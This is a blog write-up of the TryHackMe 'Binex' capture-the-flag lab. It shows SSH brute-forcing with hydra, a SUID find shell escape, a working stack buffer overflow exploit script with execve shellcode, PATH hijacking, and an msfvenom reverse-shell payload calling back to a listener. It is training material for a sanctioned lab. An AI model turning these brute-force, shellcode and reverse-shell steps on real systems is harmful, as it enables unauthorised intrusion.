::: {}
# Binex TryHackme Writeup {#binex-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/binex Note: This room is for
Premium Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#ff71 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Binex TryHackme Writeup {#2ba7 .graf .graf--h3 .graf--leading .graf--title name="2ba7"}

<figure id="2a42" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*w8iPVGEl_7ksMyRZ.png"
class="graf-image" data-image-id="0*w8iPVGEl_7ksMyRZ.png"
data-width="376" data-height="231" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/binex](https://tryhackme.com/room/binex){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/binex"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

### Topics {#fbd2 .graf .graf--h3 .graf-after--p name="fbd2"}

- [Network Enumeration]{#3a51}
- [Linux Enumeration]{#0f1e}
- [SMB Enumeration]{#62de}
- [Brute Forcing (SSH)]{#08c7}
- [Abusing SUID/GUID]{#6f4f}
- [Buffer Overflow]{#c622}
- [Exploiting PATH Variable]{#d3f4}

### Enumeration {#48cb .graf .graf--h3 .graf-after--li name="48cb"}

<figure id="ef96" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*5SFxLhMMOtnBS5e9.png"
class="graf-image" data-image-id="0*5SFxLhMMOtnBS5e9.png"
data-width="791" data-height="392" />
</figure>

The hint showed that the longest username in RID range 1000--1003 has an
insecure password. We then run enum4linux to enumerate the users.

``` {#50a0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
enum4linux -a 10.10.156.34
```

<figure id="67e5" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*AOi1kOJSIi3d0MbK.png"
class="graf-image" data-image-id="0*AOi1kOJSIi3d0MbK.png"
data-width="802" data-height="275" />
</figure>

So now we have users

**kel, des, tryhackme, noentry**

Now let's get access to the system via this user by brute-forcing the
SSH service Using hydra tool.

``` {#16a2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
hydra -l tryhackme -P rockyou.txt ssh://10.10.156.34
```

<figure id="385f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Tk64STYsaxF8thU4.png"
class="graf-image" data-image-id="0*Tk64STYsaxF8thU4.png"
data-width="790" data-height="326" />
</figure>

### SSH {#342e .graf .graf--h3 .graf-after--figure name="342e"}

``` {#c533 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh tryhackme@10.10.156.34
```

<figure id="1fbd" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*n7M7DV__j6NZUyJE.png"
class="graf-image" data-image-id="0*n7M7DV__j6NZUyJE.png"
data-width="680" data-height="216" />
</figure>

The next step is to gain the permissions of the user des.\
Are there any setuid binaries by des?

``` {#1b94 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
find / -type f -perm -u=s -user des -ls 2>/dev/null
```

<figure id="bda2" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*JbvuIOQM1ETHj8WA.png"
class="graf-image" data-image-id="0*JbvuIOQM1ETHj8WA.png"
data-width="875" data-height="80" />
</figure>

We can execute the find command as the user des.

Let's have a look at
[**Gtfobins**](https://gtfobins.github.io/gtfobins/find/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/find/"
rel="noopener ugc nofollow noopener" target="_blank"} if this can be
exploited in order to give us a shell.

<figure id="1e78" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jR4SR3-XKgvoWLPY.png"
class="graf-image" data-image-id="0*jR4SR3-XKgvoWLPY.png"
data-width="836" data-height="313" />
</figure>

[https://gtfobins.github.io/gtfobins/find/#suid](https://gtfobins.github.io/gtfobins/find/#suid){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/find/#suid"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#b037 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/bin/find . -exec /bin/sh -p \; -quit
```

<figure id="1c55" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*epzYg-StHBsJcbNW.png"
class="graf-image" data-image-id="0*epzYg-StHBsJcbNW.png"
data-width="768" data-height="258" />
</figure>

We are still the user tryhackme but we have gained an effective user and
ID of des

<figure id="b2c8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*LEQhJVoAGpL4dczv.png"
class="graf-image" data-image-id="0*LEQhJVoAGpL4dczv.png"
data-width="689" data-height="240" />
</figure>

Let's Switch our user to **des**

### Task 3. Buffer Overflow :: Binary 2 {#8934 .graf .graf--h3 .graf-after--p name="8934"}

``` {#30bc .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh des@10.10.156.34
```

<figure id="8f7d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*UdE7GSz6HPBvThct.png"
class="graf-image" data-image-id="0*UdE7GSz6HPBvThct.png"
data-width="608" data-height="411" />
</figure>

Looking at the home directory, we see flag.txt and an executable bof and
its corresponding bof.c source code. Also, we find that bof actually
belongs to user kel and that its SUID bit is set. We can use this to
pivot to become kel.

<figure id="5fdd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tK299-M8EfCthqty.png"
class="graf-image" data-image-id="0*tK299-M8EfCthqty.png"
data-width="542" data-height="353" />
</figure>

This code looks like it is vulnerable to a buffer overflow
vulnerability. The user can input 1000 bytes\
even though the buffer is 600 bytes. This means that we can overflow
into other areas of the stack.\
Executing the program, just like the source code tells us, it will just
echo back a string to stdout.

<figure id="ce2f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*iXRkAf2I3pONvYiq.png"
class="graf-image" data-image-id="0*iXRkAf2I3pONvYiq.png"
data-width="325" data-height="169" />
</figure>

Let's Transfer this file in Attacker Machine and supply it with 1000
bytes and see if it crashes. If it crashes we can verify that it can
exploited.

``` {#8031 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
python -c 'print("A" * 1000)' | ./bof
```

<figure id="5f53" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*PTNXp8JSibVsKVa6.png"
class="graf-image" data-image-id="0*PTNXp8JSibVsKVa6.png"
data-width="599" data-height="126" />
</figure>

It turns out it is susceptible to buffer overflow exploitation!

Through trial and error, we find that the program crashes with an input
of 700 characters.

For this task i will use gdb-peda, you can check out this articles for
[peda
installation](https://medium.com/bugbountywriteup/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/bugbountywriteup/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8"
rel="noopener" target="_blank"}

<figure id="06b8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*DS0RQf2a68ua_M4S.png"
class="graf-image" data-image-id="0*DS0RQf2a68ua_M4S.png"
data-width="644" data-height="495" />
</figure>

However, RIP is not overwritten here.

<figure id="3c05" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*gJwjSnj-qGIiOM9Y.png"
class="graf-image" data-image-id="0*gJwjSnj-qGIiOM9Y.png"
data-width="388" data-height="113" />
</figure>

If we take a look at the registers, we find RSP is pointing to the user
buffer.

<figure id="1433" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*13D79sXaAWNYEYEd.png"
class="graf-image" data-image-id="0*13D79sXaAWNYEYEd.png"
data-width="617" data-height="579" />
</figure>

<figure id="61a6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*bBoCMNW1RN4h27vM.png"
class="graf-image" data-image-id="0*bBoCMNW1RN4h27vM.png"
data-width="875" data-height="103" />
</figure>

We can use RBP to compute for the offset to the RIP for this case here.

<figure id="7ceb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8hh7ufumwcNLpU4N.png"
class="graf-image" data-image-id="0*8hh7ufumwcNLpU4N.png"
data-width="495" data-height="90" />
</figure>

The above means that the offset to RIP overwrite is 608 + 8 bytes. We
can test this by:

<figure id="c714" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*p7KsH7XeGit99_K7.png"
class="graf-image" data-image-id="0*p7KsH7XeGit99_K7.png"
data-width="875" data-height="243" />
</figure>

Using gdb-peda, we can send eip.txt to bof.

<figure id="8447" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6kRYdIgMVyoQumCq.png"
class="graf-image" data-image-id="0*6kRYdIgMVyoQumCq.png"
data-width="603" data-height="407" />
</figure>

RIP is not overwritten as we hoped. However, RBP is overwritten as
expected though.

We find bof wants to return to the RSP ("CCCCCCCCCC").

<figure id="ae33" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oBQnkYqY-YPdMsPn.png"
class="graf-image" data-image-id="0*oBQnkYqY-YPdMsPn.png"
data-width="849" data-height="192" />
</figure>

The reason why RIP is not 0x4343434343434343 is because most of the
addresses are 6-bytes and not 8. Let's try reducing the number of "C"s.

<figure id="8864" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IMj_VPOxmdvcoomO.png"
class="graf-image" data-image-id="0*IMj_VPOxmdvcoomO.png"
data-width="695" data-height="59" />
</figure>

``` {#7ebe .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'print "A"*608 + "B"*8 + "C"*6 +"\x00"*2' > eip.txt
```

<figure id="a1ac" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*jnHzEzTwCz2iuCHP.png"
class="graf-image" data-image-id="0*jnHzEzTwCz2iuCHP.png"
data-width="559" data-height="377" />
</figure>

So now we know that RIP can be overwritten! We also know that prior to
the return, the RSP is 0x7fffffffe010. We can have a very large NOP sled
at the start of the buffer. Let's try with the following script:

<figure id="cb5c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5PNnCBp5JIi7uO3Z.png"
class="graf-image" data-image-id="0*5PNnCBp5JIi7uO3Z.png"
data-width="487" data-height="287" />
</figure>

``` {#1994 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
from struct import pack
buf="\xcc"*8
payload="\x90"*400
payload += buf
payload += "A" * (208 -len(buf))
payload +="B" *8
payload += pack("<Q", 0x7fffffffe010)print payload
```

We then test this out as follows:

<figure id="a334" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*HaEY83Gj562rf8ZA.png"
class="graf-image" data-image-id="0*HaEY83Gj562rf8ZA.png"
data-width="640" data-height="631" />
</figure>

As shown above, execution breaks at the int 3 instruction!

Using the provided shellcode and the tweaking the original script a
little, we get:

``` {#c1d5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```

<figure id="75af" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*mJ-aR4z-rsuPTrno.png"
class="graf-image" data-image-id="0*mJ-aR4z-rsuPTrno.png"
data-width="875" data-height="256" />
</figure>

This is our final exploit

``` {#90a0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
from struct import pack
#buf="\xcc"*8
buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload="\x90"*400
payload += buf
payload += "A" * (208 -len(buf))
payload +="B" *8
payload += pack("<Q", 0x7fffffffe300)
print payload
```

<figure id="676c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Hat-8AAHtHB8PvbT.png"
class="graf-image" data-image-id="0*Hat-8AAHtHB8PvbT.png"
data-width="527" data-height="234" />
</figure>

<figure id="434f" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*vdae_4kuoo2cJF24.png"
class="graf-image" data-image-id="0*vdae_4kuoo2cJF24.png"
data-width="483" data-height="235" />
</figure>

### Task 4. PATH Manipulation :: Binary 3 {#59e9 .graf .graf--h3 .graf-after--figure name="59e9"}

Looking at /home/kel directory, we find a file named "exe". Looking at
the source code, we see that exe calls "ps". We can manipulate the PATH
variable such that it calls a file we own.

<figure id="88bf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5nxlLp6zHPos-69K.png"
class="graf-image" data-image-id="0*5nxlLp6zHPos-69K.png"
data-width="438" data-height="369" />
</figure>

The program calls the system command **ps .** the system searches the ps
command in the directories from PATH variable. So we can create a file
named ps which executes a shell. We add the path to this file at the
start of the PATH variable so the system uses our created file .

if you want explore this topic .you read from here

[https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/){.markup--anchor
.markup--p-anchor
data-href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="0b43" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Q_jbgZsQSeTihFaq.png"
class="graf-image" data-image-id="0*Q_jbgZsQSeTihFaq.png"
data-width="426" data-height="258" />
</figure>

<figure id="8f15" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*RevCa6smsLo1v8kh.png"
class="graf-image" data-image-id="0*RevCa6smsLo1v8kh.png"
data-width="875" data-height="497" />
</figure>

### Note:- Another Method for Binary 2 {#0722 .graf .graf--h3 .graf-after--figure name="0722"}

There is an executable file called bof with the SUID bit and the owner
kel and the source\
code in bof.c. So the task is to exploit a buffer overflow. (For more
information on buffer\
overflow take a look here:
[https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558](https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558"
rel="noopener" target="_blank"}

``` {#a5d4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
gdb bof
```

<figure id="a700" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*uKqn3LklvU84zu2w.png"
class="graf-image" data-image-id="0*uKqn3LklvU84zu2w.png"
data-width="688" data-height="389" />
</figure>

We can use GDB to analyze registers of the application. So first run gdb
bof\
The application asks you to input a string ("Enter some string"). So try
out a long input to\
crash the program e.g. 1000 x "A". You can do this in GDB with the
following command:

``` {#b382 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
run < <(python -c 'print("A"*1000)')
```

<figure id="8698" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Sn6KIXxxWKlV-Daa.png"
class="graf-image" data-image-id="0*Sn6KIXxxWKlV-Daa.png"
data-width="654" data-height="645" />
</figure>

After that the program crashes with a segmentation fault and we can
analyze the registers.\
We see the rbp (base pointer) is overwritten with 0x4141... which is our
input. (0x41 ="A") Analyze the stack with this command: x/100x \$rsp and
x/100x \$rsp-700

<figure id="60e4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IEvSlhZbu1lNzpAH.png"
class="graf-image" data-image-id="0*IEvSlhZbu1lNzpAH.png"
data-width="798" data-height="540" />
</figure>

We can see that our "A"s (0x41) are starting there. Chose an address at
the beginning to where we will jump later. (e.g. 0x7fffffffe2fc)\
After that we also need the offset to where we place the selected
address so the program jumps to our shellcode. To get the offset you can
generate a pattern with pattern_create.rb.\
Now run the program and paste the pattern as input.

``` {#e2e7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
msf-pattern_create -l 1000
```

<figure id="914f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*79EN_XzKOZQblkut.png"
class="graf-image" data-image-id="0*79EN_XzKOZQblkut.png"
data-width="875" data-height="153" />
</figure>

<figure id="2fdc" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*XZbIhNhetloodPS_.png"
class="graf-image" data-image-id="0*XZbIhNhetloodPS_.png"
data-width="875" data-height="198" />
</figure>

<figure id="c96a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*DcPzHI_MnBF7h2Sc.png"
class="graf-image" data-image-id="0*DcPzHI_MnBF7h2Sc.png"
data-width="627" data-height="526" />
</figure>

After that the rbp (base pointer) is overwritten with the pattern. Take
the content from the rbp\
(4134754133754132) and calculate the offset with pattern_offset.rb.

<figure id="b246" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*14oWgfkIzWbCDUBB.png"
class="graf-image" data-image-id="0*14oWgfkIzWbCDUBB.png"
data-width="534" data-height="76" />
</figure>

Finally you need a shell code. The shellcode in the task did not worked
well for me and I do not know why. So I used msfvenom to create my own
shellcode with a reverse-shell

``` {#1864 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.12.26 LPORT=4444 'x00' -f python
```

<figure id="bbfa" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*dfXkp5LPqNKrAE39.png"
class="graf-image" data-image-id="0*dfXkp5LPqNKrAE39.png"
data-width="875" data-height="292" />
</figure>

I used a python script (bo.py) on the machine to calculate the lengths
and create the final payload as shown here:

<figure id="0669" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cd78hUbvNCnm3QZ3.png"
class="graf-image" data-image-id="0*cd78hUbvNCnm3QZ3.png"
data-width="716" data-height="570" />
</figure>

Transfer the paylaod into deployed machine

<figure id="614b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MTT3_OuYm8bh_wic.png"
class="graf-image" data-image-id="0*MTT3_OuYm8bh_wic.png"
data-width="345" data-height="116" />
</figure>

Start a listener (nc -lvp 4444) and execute bof with our payload outside
of GDB like this:

``` {#ffc3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./bof < <(python payload.py)
```

<figure id="86b8" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*N5rXemHYtSyUcjD6.png"
class="graf-image" data-image-id="0*N5rXemHYtSyUcjD6.png"
data-width="501" data-height="108" />
</figure>

<figure id="ded0" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*ULT4-3CkbV0MUkBu.png"
class="graf-image" data-image-id="0*ULT4-3CkbV0MUkBu.png"
data-width="632" data-height="260" />
</figure>

This gives me a reverse-shell with permissions of user kel from where we
can grab his SSH credentials in his home directory and the next flag.

### Promote and Collaborate on Cybersecurity Insights {#351a .graf .graf--h3 .graf-after--p name="351a"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#bf35 .graf .graf--h3 .graf-after--p name="bf35"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 31, 2024](https://medium.com/p/67d6afabfa6f).

[Canonical
link](https://medium.com/@bevijaygupta/binex-tryhackme-writeup-67d6afabfa6f){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
